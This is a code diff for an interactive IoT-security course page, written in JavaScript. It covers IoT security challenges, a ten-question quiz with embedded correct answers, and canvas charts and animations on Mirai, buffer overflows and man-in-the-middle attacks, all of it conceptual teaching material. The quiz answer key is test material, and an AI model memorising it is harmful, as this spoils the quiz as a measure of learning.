+      title: 'Weak Authentication and Authorization',
+      summary: 'Pre-installed factory-default passwords (e.g., admin/admin) left unmanaged, plus undetected "shadow/rogue" IoT devices joining internal networks without IT visibility.'
+    },
+    {
+      num: '02',
+      title: 'Lack of Encryption',
+      summary: 'Severe hardware memory and CPU constraints push manufacturers to skip cryptographic protocols. This creates high exposure to data breaches in medical imaging, patient telemetry, and IP camera video streams.'
+    },
+    {
+      num: '03',
+      title: 'Vulnerabilities in Firmware and Software',
+      summary: 'Low unit production budgets and aggressive time-to-market schedules result in minimal security code auditing, leaving memory corruption and command injection flaws in embedded firmware.'
+    },
+    {
+      num: '04',
+      title: 'Insecure Communications',
+      summary: 'Devices frequently operate on flat, unsegmented networks while relying on unauthenticated Bluetooth pairing, plain-text HTTP, and unvalidated cloud APIs.'
+    },
+    {
+      num: '05',
+      title: 'Difficulty in Patching and Updating Devices',
+      summary: 'Legacy and low-cost IoT hardware is rarely engineered to support automated Over-The-Air (OTA) firmware updates, security patches, or dynamic security testing.'
+    }
+  ];
+
+  const harvestDevices = [
+    {
+      id: 'smart_tv',
+      name: 'Smart TV',
+      icon: '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="7" width="20" height="15" rx="2"/><polyline points="17 2 12 7 7 2"/></svg>',
+      data: ['Account passwords & streaming credentials', 'Private emails & financial/payment data', 'Ambient room sound recordings (via built-in mic)', 'Viewing & search history']
+    },
+    {
+      id: 'voice_assistant',
+      name: 'Voice Assistant',
+      icon: '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/><line x1="12" y1="19" x2="12" y2="23"/></svg>',
+      data: ['Voice search & command history', 'Linked banking & financial transaction data', 'Daily user usage & occupancy patterns', 'Ambient indoor sound recordings']
+    },
+    {
+      id: 'connected_car',
+      name: 'Connected Cars',
+      icon: '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 16H9m10 0h3v-3.15a1 1 0 0 0-.84-.99L16 11l-2.7-3.6a1 1 0 0 0-.8-.4H5.24a2 2 0 0 0-1.8 1.1l-.8 1.63A6 6 0 0 0 2 12.42V16h2"/><circle cx="6.5" cy="16.5" r="2.5"/><circle cx="16.5" cy="16.5" r="2.5"/></svg>',
+      data: ['Real-time GPS location tracking & route history', 'Unauthorized remote control of internal automotive CAN software']
+    },
+    {
+      id: 'security_camera',
+      name: 'Smart Security Camera',
+      icon: '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg>',
+      data: ['Private live & recorded indoor/outdoor video feeds', 'Physical home or commercial facility location metadata']
+    },
+    {
+      id: 'medical_fitness',
+      name: 'Medical / Fitness Devices',
+      icon: '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>',
+      data: ['Personal healthcare & biometric telemetry', 'Continuous GPS/jogging route location tracking', 'Daily physiological activity & sleep patterns']
+    },
+    {
+      id: 'wifi_router',
+      name: 'Wi-Fi Router',
+      icon: '<svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="14" width="20" height="6" rx="2"/><path d="M6 14v-3"/><path d="M18 14v-3"/><path d="M9 8a4 4 0 0 1 6 0"/></svg>',
+      data: ['Central intercept point for ALL network passwords', 'All user login credentials across connected nodes', 'Unencrypted emails and active network messages']
+    }
+  ];
+
+  const quizQuestions = [
+    {
+      q: '1. According to the lecture projections, how many connected IoT devices are projected worldwide by 2025, and what growth factor does this represent compared to 2020?',
+      options: [
+        '30.73 billion devices (1.5x growth)',
+        '75.44 billion devices (2.5x growth from 30.73B in 2020)',
+        '50.12 billion devices (2.0x growth)',
+        '105.00 billion devices (3.4x growth)'
+      ],
+      correct: 1,
+      explanation: 'Global IoT devices grew from 15.41B (2015) to 30.73B (2020) and are projected to reach 75.44B in 2025—a 2.5x increase in 5 years.'
+    },
+    {
+      q: '2. Which IoT application domain includes autonomous surveillance robots and soldier-wearable biometric sensors for combat monitoring?',
+      options: [
+        'Industrial IoT (IIoT)',
+        'Infrastructure IoT',
+        'Military Things (IoMT)',
+        'Commercial IoT'
+      ],
+      correct: 2,
+      explanation: 'Internet of Military Things (IoMT) covers defense and combat applications such as autonomous surveillance robots and soldier biometric wearables.'
+    },
+    {
+      q: '3. In the 2015 Jeep Wireless Hack by Charlie Miller and Chris Valasek, what internal vehicle network was compromised after exploiting the Uconnect cellular interface?',
+      options: [
+        'Modbus TCP industrial bus',
+        'Controller Area Network (CAN bus)',
+        'Zigbee Mesh Network',
+        'Bluetooth Low Energy (BLE) GATT bus'
+      ],
+      correct: 1,
+      explanation: 'The attackers exploited Chrysler’s Uconnect cellular connectivity to pivot onto the internal CAN bus, disabling the accelerator on a highway.'
+    },
+    {
+      q: '4. What was the primary exploitation vector used by the 2016 Mirai botnet to compromise IP security cameras and home routers?',
+      options: [
+        'Zero-day buffer overflows in Apple HomeKit',
+        'Scanning the public Internet for devices using factory-default usernames and passwords',
+        'Physical JTAG debugging on smart meters',
+        'SQL injection against cloud billing databases'
+      ],
+      correct: 1,
+      explanation: 'Mirai scanned the Internet for consumer IoT devices (IP cameras, routers) still configured with factory-default credentials.'
+    },
+    {
+      q: '5. Which of the following is NOT listed in the lecture as an evolved variant of the Mirai botnet?',
+      options: [
+        'Hajime',
+        'Okiru',
+        'Stuxnet',
+        'Hide \'N Seek'
+      ],
+      correct: 2,
+      explanation: 'Evolved Mirai variants include Hajime, Hide \'N Seek, Masuta, PureMasuta, Wicked botnet, and Okiru. Stuxnet is an earlier ICS/SCADA worm.'
+    },
+    {
+      q: '6. In the Network Attack Vulnerability Mapping recap, which underlying weakness is directly exploited by ARP Spoofing?',
+      options: [
+        'Open TCP/UDP service ports',
+        'Unfiltered network service ports',
+        'Unsecured physical switch ports connected to malicious actors',
+        'Unencrypted wireless traffic containing credentials'
+      ],
+      correct: 2,
+      explanation: 'ARP Spoofing exploits unsecured physical switch ports where a malicious actor can inject forged ARP replies on the local Layer 2 segment.'
+    },
+    {
+      q: '7. Under the Fortinet Taxonomy of 5 Primary IoT Security Challenges, why do many IoT manufacturers omit encryption?',
+      options: [
+        'Encryption is illegal in consumer smart appliances',
+        'Severe hardware memory and processing (CPU) constraints',
+        'IPv6 automatically encrypts all IoT packets by default',
+        'Routers block encrypted TLS traffic from IoT devices'
+      ],
+      correct: 1,
+      explanation: 'Constrained RAM and processing power on low-cost IoT microcontrollers lead manufacturers to omit encryption, exposing medical and video feeds.'
+    },
+    {
+      q: '8. Why are constrained IoT devices especially vulnerable to Buffer Overflow exploits?',
+      options: [
+        'They run full Windows Server editions without firewalls',
+        'Their small RAM memory footprint causes excess input data to spill into adjacent memory spaces and overwrite execution pointers',
+        'They store passwords in plain-text QR codes on the chassis',
+        'They never use IP addresses'
+      ],
+      correct: 1,
+      explanation: 'Because IoT devices have tight RAM footprints, unchecked input lengths overflow buffers and overwrite adjacent execution pointers to hijack program flow.'
+    },
+    {
+      q: '9. What distinguishes IoT Spoofing from IoT Sniffing in Man-in-the-Middle (MitM) scenarios?',
+      options: [
+        'Sniffing modifies router firmware, while Spoofing only reads battery percentages',
+        'Sniffing passively intercepts unencrypted traffic, whereas Spoofing disguises a rogue device as a legitimate IoT node to compromise the router and spread malware laterally',
+        'Sniffing only works over Ethernet cables, while Spoofing only works over 5G',
+        'There is no difference between the two terms'
+      ],
+      correct: 1,
+      explanation: 'IoT Sniffing passively eavesdrops on unencrypted traffic, while IoT Spoofing masquerades as a legitimate node to infiltrate the router and spread laterally.'
+    },
+    {
+      q: '10. According to password security studies cited in the lecture, approximately what percentage of users reuse the same password across multiple devices?',
+      options: [
+        '15%',
+        '32%',
+        'Nearly 60%',
+        '95%'
+      ],
+      correct: 2,
+      explanation: 'Nearly 60% of users reuse the same password across multiple devices, allowing attackers who breach one IoT device to pivot across all network devices.'
+    }
+  ];
+
+  // ==================== NAVIGATION & PROGRESS ====================
+  window.goToModule = function(modNum) {
+    state.currentModule = modNum;
+    state.visitedModules.add(modNum);
+
+    // Update active section
+    document.querySelectorAll('.module-section').forEach(sec => sec.classList.remove('active'));
+    const targetSec = document.getElementById(`module-${modNum}`);
+    if (targetSec) targetSec.classList.add('active');
+
+    // Update sidebar nav buttons
+    document.querySelectorAll('.nav-btn').forEach(btn => {
+      const btnMod = Number(btn.dataset.module);
+      btn.classList.toggle('active', btnMod === modNum);
+      if (state.visitedModules.has(btnMod) && btnMod !== modNum) {
+        btn.classList.add('completed');
+      } else {
+        btn.classList.remove('completed');
+      }
+    });
+
+    // Update progress bar
+    const pct = Math.round((state.visitedModules.size / 5) * 100);
+    document.getElementById('progressPercent').textContent = `${pct}%`;
+    document.getElementById('mobileProgressTag').textContent = `${pct}%`;
+    document.getElementById('progressBarFill').style.width = `${pct}%`;
+
+    // Close mobile sidebar if open
+    document.getElementById('sidebar').classList.remove('open');
+    document.getElementById('sidebarBackdrop').classList.remove('open');
+
+    // Trigger canvas redraws when switching modules
+    if (modNum === 1) {
+      animateGrowthChart();
+    } else if (modNum === 2) {
+      drawMiraiChart();
+    }
+
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  };
+
+  document.querySelectorAll('.nav-btn').forEach(btn => {
+    btn.addEventListener('click', () => goToModule(Number(btn.dataset.module)));
+  });
+
+  // Mobile Menu Toggle
+  const menuToggle = document.getElementById('menuToggle');
+  const sidebar = document.getElementById('sidebar');
+  const sidebarBackdrop = document.getElementById('sidebarBackdrop');
+
+  menuToggle.addEventListener('click', () => {
+    sidebar.classList.toggle('open');
+    sidebarBackdrop.classList.toggle('open');
+  });
+
+  sidebarBackdrop.addEventListener('click', () => {
+    sidebar.classList.remove('open');
+    sidebarBackdrop.classList.remove('open');
+  });
+
+  // ==================== MODULE 1: GROWTH CHART (CANVAS) ====================
+  const growthCanvas = document.getElementById('growthChartCanvas');
+  const growthCtx = growthCanvas.getContext('2d');
+  const growthData = [
+    { year: '2015', value: 15.41, label: '15.41 Billion', note: 'Baseline Connected Devices', color: '#06b6d4' },
+    { year: '2020', value: 30.73, label: '30.73 Billion', note: '2.0x Growth vs 2015', color: '#10b981' },
+    { year: '2025 (Proj.)', value: 75.44, label: '75.44 Billion', note: '2.5x Growth vs 2020!', color: '#f59e0b' }
+  ];
+  let barHitboxes = [];
+
+  function drawGrowthChart(progress = 1) {
+    const rect = growthCanvas.parentElement.getBoundingClientRect();
+    const dpr = window.devicePixelRatio || 1;
+    const width = Math.max(300, rect.width - 32);
+    const height = 260;
+
+    growthCanvas.width = width * dpr;
+    growthCanvas.height = height * dpr;
+    growthCanvas.style.width = `${width}px`;
+    growthCanvas.style.height = `${height}px`;
+    growthCtx.scale(dpr, dpr);
+
+    growthCtx.clearRect(0, 0, width, height);
+
+    const padLeft = 56;
+    const padRight = 30;
+    const padTop = 34;
+    const padBottom = 46;
+    const chartW = width - padLeft - padRight;
+    const chartH = height - padTop - padBottom;
+    const maxVal = 85;
+
+    // Horizontal gridlines
+    growthCtx.strokeStyle = '#1e293b';
+    growthCtx.lineWidth = 1;
+    growthCtx.font = '11px monospace';
+    growthCtx.fillStyle = '#64748b';
+    growthCtx.textAlign = 'right';
+
+    for (let v = 0; v <= 80; v += 20) {
+      const y = padTop + chartH - (v / maxVal) * chartH;
+      growthCtx.beginPath();
+      growthCtx.moveTo(padLeft, y);
+      growthCtx.lineTo(width - padRight, y);
+      growthCtx.stroke();
+      growthCtx.fillText(`${v}B`, padLeft - 10, y + 4);
+    }
+
+    // Bars
+    const slotW = chartW / growthData.length;
+    const barW = Math.min(92, slotW * 0.52);
+    barHitboxes = [];
+
+    growthData.forEach((d, idx) => {
+      const currentVal = d.value * progress;
+      const barH = (currentVal / maxVal) * chartH;
+      const x = padLeft + idx * slotW + (slotW - barW) / 2;
+      const y = padTop + chartH - barH;
+
+      barHitboxes.push({ x, y, w: barW, h: barH, idx });
+
+      // Glow if hovered
+      if (state.hoveredBarIndex === idx) {
+        growthCtx.shadowColor = d.color;
+        growthCtx.shadowBlur = 16;
+      } else {
+        growthCtx.shadowBlur = 0;
+      }
+
+      // Rounded top bar
+      const grad = growthCtx.createLinearGradient(0, y, 0, padTop + chartH);
+      grad.addColorStop(0, d.color);
+      grad.addColorStop(1, 'rgba(15, 23, 42, 0.4)');
+      growthCtx.fillStyle = grad;
+
+      growthCtx.beginPath();
+      const r = Math.min(8, barH / 2);
+      growthCtx.moveTo(x, padTop + chartH);
+      growthCtx.lineTo(x, y + r);
+      growthCtx.quadraticCurveTo(x, y, x + r, y);
+      growthCtx.lineTo(x + barW - r, y);
+      growthCtx.quadraticCurveTo(x + barW, y, x + barW, y + r);
+      growthCtx.lineTo(x + barW, padTop + chartH);
+      growthCtx.closePath();
+      growthCtx.fill();
+      growthCtx.shadowBlur = 0;
+
+      // Value label above bar
+      growthCtx.fillStyle = '#f8fafc';
+      growthCtx.font = 'bold 13px monospace';
+      growthCtx.textAlign = 'center';
+      growthCtx.fillText(`${currentVal.toFixed(2)}B`, x + barW / 2, y - 10);
+
+      // X-axis year
+      growthCtx.fillStyle = '#cbd5e1';
+      growthCtx.font = 'bold 12px sans-serif';
+      growthCtx.fillText(d.year, x + barW / 2, padTop + chartH + 20);
+
+      // Sub-note
+      growthCtx.fillStyle = d.color;
+      growthCtx.font = '10px sans-serif';
+      growthCtx.fillText(d.note, x + barW / 2, padTop + chartH + 35);
+    });
+  }
+
+  function animateGrowthChart() {
+    let start = null;
+    const duration = 650;
+    function step(ts) {
+      if (!start) start = ts;
+      const p = Math.min(1, (ts - start) / duration);
+      const eased = 1 - Math.pow(1 - p, 3);
+      drawGrowthChart(eased);
+      if (p < 1) requestAnimationFrame(step);
+    }
+    requestAnimationFrame(step);
+  }
+
+  document.getElementById('replayGrowthChart').addEventListener('click', animateGrowthChart);
+
+  growthCanvas.addEventListener('mousemove', (e) => {
+    const rect = growthCanvas.getBoundingClientRect();
+    const mx = e.clientX - rect.left;
+    const my = e.clientY - rect.top;
+    let found = -1;
+    barHitboxes.forEach(b => {
+      if (mx >= b.x && mx <= b.x + b.w && my >= b.y && my <= b.y + b.h) {
+        found = b.idx;
+      }
+    });
+    if (found !== state.hoveredBarIndex) {
+      state.hoveredBarIndex = found;
+      growthCanvas.style.cursor = found !== -1 ? 'pointer' : 'default';
+      drawGrowthChart(1);
+    }
+  });
+
+  // ==================== MODULE 1: PRODUCT TELEMETRY & DOMAINS ====================
+  function renderProductDrawer(prodKey) {
+    const p = productTelemetryData[prodKey];
+    const drawer = document.getElementById('productTelemetryDrawer');
+    drawer.innerHTML = `
+      <div style="display:flex;justify-content:space-between;flex-wrap:wrap;gap:6px;margin-bottom:0.5rem;">
+        <strong style="color:var(--accent-cyan);font-size:0.9rem;">${p.title}</strong>
+        <span class="tag tag-amber">${p.domain}</span>
+      </div>
+      <div style="color:var(--text-muted);margin-bottom:0.5rem;">Connectivity: ${p.protocol}</div>
+      <ul style="padding-left:1.15rem;color:var(--text-primary);display:flex;flex-direction:column;gap:4px;">
+        ${p.telemetry.map(line => `<li>${line}</li>`).join('')}
+      </ul>
+    `;
+  }
+
+  document.querySelectorAll('.product-card').forEach(card => {
+    card.addEventListener('click', () => {
+      document.querySelectorAll('.product-card').forEach(c => c.classList.remove('selected'));
+      card.classList.add('selected');
+      renderProductDrawer(card.dataset.product);
+    });
+  });
+  renderProductDrawer('hitachi');
+
+  function renderDomainCards(filter) {
+    const container = document.getElementById('domainCardsContainer');
+    const filtered = filter === 'all' ? iotDomains : iotDomains.filter(d => d.id === filter);
+    container.innerHTML = filtered.map(d => `
+      <div class="concept-box" style="border-left-width:4px;">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:0.4rem;">
+          <h4 style="font-size:0.98rem;">${d.name}</h4>
+          <span class="tag ${d.tagClass}">${d.tag}</span>
+        </div>
+        <p style="margin-bottom:0.55rem;">${d.desc}</p>
+        <div style="font-size:0.8rem;color:var(--accent-cyan);background:rgba(6,182,212,0.08);padding:6px 10px;border-radius:6px;">
+          <strong>Slide Examples:</strong> ${d.examples}
+        </div>
+      </div>
+    `).join('');
+  }
+
+  document.querySelectorAll('#domainFilterBar .filter-btn').forEach(btn => {
+    btn.addEventListener('click', () => {
+      document.querySelectorAll('#domainFilterBar .filter-btn').forEach(b => b.classList.remove('active'));
+      btn.classList.add('active');
+      renderDomainCards(btn.dataset.domain);
+    });
+  });
+  renderDomainCards('all');
+
+  // ==================== MODULE 2: JEEP HACK & MIRAI CHART ====================
+  function renderJeepDetail(stepIdx) {
+    const s = jeepStages[stepIdx];
+    document.getElementById('jeepDetailPanel').innerHTML = `
+      <h4 style="color:var(--accent-coral);font-size:0.98rem;margin-bottom:0.4rem;">${s.title}</h4>
+      <p style="font-size:0.88rem;color:var(--text-primary);">${s.detail}</p>
+    `;
+  }
+
+  document.querySelectorAll('#jeepAttackChain .chain-step').forEach(stepEl => {
+    stepEl.addEventListener('click', () => {
+      document.querySelectorAll('#jeepAttackChain .chain-step').forEach(el => el.classList.remove('active'));
+      stepEl.classList.add('active');
+      renderJeepDetail(Number(stepEl.dataset.step));
+    });
+  });
+  renderJeepDetail(0);
+
+  // Mirai Volumetric Chart
+  const miraiCanvas = document.getElementById('miraiChartCanvas');
+  const miraiCtx = miraiCanvas.getContext('2d');
+
+  function drawMiraiChart() {
+    const rect = miraiCanvas.parentElement.getBoundingClientRect();
+    const dpr = window.devicePixelRatio || 1;
+    const width = Math.max(300, rect.width - 32);
+    const height = 210;
+
+    miraiCanvas.width = width * dpr;
+    miraiCanvas.height = height * dpr;
+    miraiCanvas.style.width = `${width}px`;
+    miraiCanvas.style.height = `${height}px`;
+    miraiCtx.scale(dpr, dpr);
+
+    miraiCtx.clearRect(0, 0, width, height);
+
+    const targets = [
+      { name: 'KrebsOnSecurity (Sept 2016)', gbps: 630, display: '630 Gbps', color: '#f59e0b' },
+      { name: 'OVH French Hosting (Sept 2016)', gbps: 1100, display: '1.1 Tbps (1,100 Gbps)', color: '#f43f5e' },
+      { name: 'Dyn DNS Provider (Oct 2016)', gbps: 1200, display: '~1.2 Tbps Global Outage', color: '#8b5cf6' }
+    ];
+
+    const padLeft = 18;
+    const padRight = 24;
+    const rowH = 56;
+
+    miraiCtx.font = 'bold 12px sans-serif';
+    targets.forEach((t, i) => {
+      const yTop = 16 + i * rowH;
+      miraiCtx.fillStyle = '#e2e8f0';
+      miraiCtx.textAlign = 'left';
+      miraiCtx.fillText(t.name, padLeft, yTop + 12);
+
+      miraiCtx.fillStyle = t.color;
+      miraiCtx.font = 'bold 12px monospace';
+      miraiCtx.textAlign = 'right';
+      miraiCtx.fillText(t.display, width - padRight, yTop + 12);
+
+      const maxBarW = width - padLeft - padRight;
+      const barW = (t.gbps / 1300) * maxBarW;
+
+      // Track
+      miraiCtx.fillStyle = '#1e293b';
+      miraiCtx.fillRect(padLeft, yTop + 20, maxBarW, 14);
+
+      // Fill
+      miraiCtx.fillStyle = t.color;
+      miraiCtx.fillRect(padLeft, yTop + 20, barW, 14);
+      miraiCtx.font = 'bold 12px sans-serif';
+    });
+  }
+
+  // ==================== MODULE 3: VULNERABILITY MATCHER & FORTINET ====================
+  function initMatcher() {
+    state.matchedPairs.clear();
+    state.selectedAttack = null;
+    state.selectedWeakness = null;
+    document.getElementById('matchScoreTag').textContent = '0 / 5 Matched';
+
+    const attackCol = document.getElementById('attackCol');
+    const weaknessCol = document.getElementById('weaknessCol');
+
+    // Shuffle weaknesses for active recall
+    const shuffledWeaknesses = [...networkMatchPairs].sort(() => Math.random() - 0.5);
+
+    attackCol.innerHTML = networkMatchPairs.map(item => `
+      <div class="match-item" data-id="${item.id}" data-type="attack">
+        <span>${item.attack}</span>
+        <span class="status-icon" style="font-family:var(--font-mono);font-size:0.75rem;"></span>
+      </div>
+    `).join('');
+
+    weaknessCol.innerHTML = shuffledWeaknesses.map(item => `
+      <div class="match-item" data-id="${item.id}" data-type="weakness">
+        <span>${item.weakness}</span>
+        <span class="status-icon" style="font-family:var(--font-mono);font-size:0.75rem;"></span>
+      </div>
+    `).join('');
+
+    document.querySelectorAll('.match-item').forEach(el => {
+      el.addEventListener('click', () => handleMatchClick(el));
+    });
+  }
+
+  function handleMatchClick(el) {
+    const id = el.dataset.id;
+    const type = el.dataset.type;
+    if (state.matchedPairs.has(id)) return;
+
+    if (type === 'attack') {
+      document.querySelectorAll('#attackCol .match-item').forEach(i => i.classList.remove('selected'));
+      el.classList.add('selected');
+      state.selectedAttack = id;
+    } else {
+      document.querySelectorAll('#weaknessCol .match-item').forEach(i => i.classList.remove('selected'));
+      el.classList.add('selected');
+      state.selectedWeakness = id;
+    }
+
+    if (state.selectedAttack && state.selectedWeakness) {
+      const aEl = document.querySelector(`#attackCol .match-item[data-id="${state.selectedAttack}"]`);
+      const wEl = document.querySelector(`#weaknessCol .match-item[data-id="${state.selectedWeakness}"]`);
+
+      if (state.selectedAttack === state.selectedWeakness) {
+        state.matchedPairs.add(state.selectedAttack);
+        aEl.classList.remove('selected');
+        wEl.classList.remove('selected');
+        aEl.classList.add('matched');
+        wEl.classList.add('matched');
+        aEl.querySelector('.status-icon').textContent = '✓';
+        wEl.querySelector('.status-icon').textContent = '✓';
+        document.getElementById('matchScoreTag').textContent = `${state.matchedPairs.size} / 5 Matched`;
+      } else {
+        aEl.classList.add('wrong');
+        wEl.classList.add('wrong');
+        setTimeout(() => {
+          aEl.classList.remove('wrong', 'selected');
+          wEl.classList.remove('wrong', 'selected');
+        }, 420);
+      }
+      state.selectedAttack = null;
+      state.selectedWeakness = null;
+    }
+  }
+
+  document.getElementById('resetMatcherBtn').addEventListener('click', initMatcher);
+  initMatcher();
+
+  // Fortinet 5 Accordion
+  const accordionContainer = document.getElementById('fortinetAccordion');
+  accordionContainer.innerHTML = fortinetChallenges.map((c, idx) => `
+    <div class="accordion-item ${idx === 0 ? 'open' : ''}">
+      <button class="accordion-header">
+        <span><span style="color:var(--accent-cyan);font-family:var(--font-mono);margin-right:8px;">#${c.num}</span> ${c.title}</span>
+        <span class="accordion-chevron">&#9662;</span>
+      </button>
+      <div class="accordion-body">${c.summary}</div>
+    </div>
+  `).join('');
+
+  accordionContainer.querySelectorAll('.accordion-header').forEach(header => {
+    header.addEventListener('click', () => {
+      header.parentElement.classList.toggle('open');
+    });
+  });
+
+  document.getElementById('expandAllChallengesBtn').addEventListener('click', () => {
+    const items = accordionContainer.querySelectorAll('.accordion-item');
+    const anyClosed = Array.from(items).some(i => !i.classList.contains('open'));
+    items.forEach(i => i.classList.toggle('open', anyClosed));
+  });
+
+  // ==================== MODULE 4: BUFFER OVERFLOW, MITM, BOTNET & HARVEST ====================
+  // 4.1 Tabs
+  document.querySelectorAll('#exploitTabs .tab-btn').forEach(btn => {
+    btn.addEventListener('click', () => {
+      document.querySelectorAll('#exploitTabs .tab-btn').forEach(b => b.classList.remove('active'));
+      btn.classList.add('active');
+      document.querySelectorAll('.exploit-tab-content').forEach(c => c.style.display = 'none');
+      document.getElementById(`tab-${btn.dataset.tab}`).style.display = 'block';
+    });
+  });
+
+  // Buffer Overflow RAM Visualizer
+  const payloadSlider = document.getElementById('payloadSlider');
+  const ramCellsContainer = document.getElementById('ramCellsContainer');
+
+  function updateRamSimulation(len) {
+    document.getElementById('payloadLenVal').textContent = `${len} byte${len > 1 ? 's' : ''}`;
+    const badge = document.getElementById('memoryStatusBadge');
+    const exp = document.getElementById('overflowExplanation');
+
+    if (len <= 12) {
+      badge.className = 'tag tag-emerald';
+      badge.textContent = 'SAFE: Within Allocated Buffer';
+      exp.innerHTML = `<strong>Normal Execution:</strong> Input (${len} bytes) fits inside the 12-byte buffer. Bytes 12–15 (Execution Return Pointer) remain intact.`;
+    } else {
+      badge.className = 'tag tag-coral';
+      badge.textContent = `CRITICAL OVERFLOW: ${len - 12} Bytes Corrupted!`;
+      exp.innerHTML = `<strong style="color:var(--accent-coral);">Buffer Overflow Triggered!</strong> Constrained RAM caused ${len - 12} excess byte(s) to spill into adjacent memory, overwriting the <strong>execution pointer</strong> to redirect program flow to attacker shellcode!`;
+    }
+
+    let html = '';
+    for (let i = 0; i < 16; i++) {
+      const isBuffer = i < 12;
+      let cls = isBuffer ? 'ram-cell buffer-zone' : 'ram-cell pointer-zone';
+      let label = isBuffer ? `0x0${i.toString(16).toUpperCase()}` : 'PTR';
+
+      if (i < len) {
+        if (isBuffer) {
+          cls += ' filled-safe';
+          label = 'DATA';
+        } else {
+          cls += ' filled-overflow';
+          label = '0x41!';
+        }
+      }
+      html += `<div class="${cls}">${label}</div>`;
+    }
+    ramCellsContainer.innerHTML = html;
+  }
+
+  payloadSlider.addEventListener('input', (e) => updateRamSimulation(Number(e.target.value)));
+  updateRamSimulation(8);
+
+  // 4.3 MitM Sniffing vs Spoofing Animated Canvas
+  const mitmCanvas = document.getElementById('mitmCanvas');
+  const mitmCtx = mitmCanvas.getContext('2d');
+  let animTick = 0;
+
+  function updateMitmDescription() {
+    const box = document.getElementById('mitmDescriptionBox');
+    if (state.mitmMode === 'sniffing') {
+      box.className = 'concept-box';
+      box.innerHTML = `
+        <h4>IoT Sniffing (Passive Interception)</h4>
+        <p>The attacker passively intercepts unencrypted inbound and outbound wireless packets between smart devices and the Wi-Fi router in open/weakly secured environments—capturing plaintext passwords, emails, and financial data without altering traffic flow.</p>
+      `;
+    } else {
+      box.className = 'concept-box coral';
+      box.innerHTML = `
+        <h4>IoT Spoofing (Active Impersonation &amp; Lateral Spread)</h4>
+        <p>The attacker disguises a <strong>rogue device</strong> as a legitimate IoT node to authenticate with the Wi-Fi router. Once trusted inside the network, the attacker compromises the router and injects malware that spreads laterally to all connected IoT devices.</p>
+      `;
+    }
+  }
+
+  document.getElementById('mitmSniffBtn').addEventListener('click', () => {
+    state.mitmMode = 'sniffing';
+    document.getElementById('mitmSniffBtn').classList.add('active');
+    document.getElementById('mitmSpoofBtn').classList.remove('active');
+    updateMitmDescription();
+  });
+
+  document.getElementById('mitmSpoofBtn').addEventListener('click', () => {
+    state.mitmMode = 'spoofing';
+    document.getElementById('mitmSpoofBtn').classList.add('active');
+    document.getElementById('mitmSniffBtn').classList.remove('active');
+    updateMitmDescription();
+  });
+  updateMitmDescription();
+
+  function drawNodeBox(ctx, x, y, w, h, title, sub, borderColor) {
+    ctx.fillStyle = '#111827';
+    ctx.strokeStyle = borderColor;
+    ctx.lineWidth = 2;
+    ctx.beginPath();
+    ctx.roundRect(x - w / 2, y - h / 2, w, h, 10);
+    ctx.fill();
+    ctx.stroke();
+
+    ctx.fillStyle = '#f8fafc';
+    ctx.font = 'bold 12px sans-serif';
+    ctx.textAlign = 'center';
+    ctx.fillText(title, x, y - 4);
+
+    ctx.fillStyle = '#94a3b8';
+    ctx.font = '10px monospace';
+    ctx.fillText(sub, x, y + 13);
+  }
+
+  function renderAnimations() {
+    animTick += 0.015;
+
+    // 1. MitM Canvas (if Module 4 visible)
+    if (state.currentModule === 4 && mitmCanvas.parentElement) {
+      const rect = mitmCanvas.parentElement.getBoundingClientRect();
+      const dpr = window.devicePixelRatio || 1;
+      const w = Math.max(300, rect.width - 32);
+      const h = 220;
+      if (mitmCanvas.width !== Math.round(w * dpr)) {
+        mitmCanvas.width = w * dpr;
+        mitmCanvas.height = h * dpr;
+        mitmCanvas.style.width = `${w}px`;
+        mitmCanvas.style.height = `${h}px`;
+      }
+      mitmCtx.save();
+      mitmCtx.scale(dpr, dpr);
+      mitmCtx.clearRect(0, 0, w, h);
+
+      const leftX = w * 0.18;
+      const midX = w * 0.5;
+      const rightX = w * 0.82;
+      const topY = 55;
+      const botY = 165;
+
+      // Link line between IoT Device and Router
+      mitmCtx.strokeStyle = '#334155';
+      mitmCtx.lineWidth = 2;
+      mitmCtx.setLineDash([5, 5]);
+      mitmCtx.beginPath();
+      mitmCtx.moveTo(leftX, topY);
+      mitmCtx.lineTo(rightX, topY);
+      mitmCtx.stroke();
+      mitmCtx.setLineDash([]);
+
+      if (state.mitmMode === 'sniffing') {
+        // Eavesdrop line from midpoint down to attacker
+        mitmCtx.strokeStyle = '#06b6d4';
+        mitmCtx.setLineDash([4, 4]);
+        mitmCtx.beginPath();
+        mitmCtx.moveTo(midX, topY);
+        mitmCtx.lineTo(midX, botY - 24);
+        mitmCtx.stroke();
+        mitmCtx.setLineDash([]);
+
+        // Animated plaintext packet
+        const p = (animTick % 1);
+        const px = leftX + (rightX - leftX) * p;
+        mitmCtx.fillStyle = '#10b981';
+        mitmCtx.beginPath();
+        mitmCtx.arc(px, topY, 6, 0, Math.PI * 2);
+        mitmCtx.fill();
+
+        // Copied packet dropping to sniffer
+        const sy = topY + (botY - 24 - topY) * ((animTick * 1.4) % 1);
+        mitmCtx.fillStyle = '#06b6d4';
+        mitmCtx.beginPath();
+        mitmCtx.arc(midX, sy, 5, 0, Math.PI * 2);
+        mitmCtx.fill();
+
+        drawNodeBox(mitmCtx, leftX, topY, 125, 48, 'Smart IoT Node', 'HTTP / Unencrypted', '#10b981');
+        drawNodeBox(mitmCtx, rightX, topY, 125, 48, 'Wi-Fi Router', 'Open / Weak WLAN', '#06b6d4');
+        drawNodeBox(mitmCtx, midX, botY, 165, 48, 'Attacker Sniffer', 'Reads Credentials', '#f59e0b');
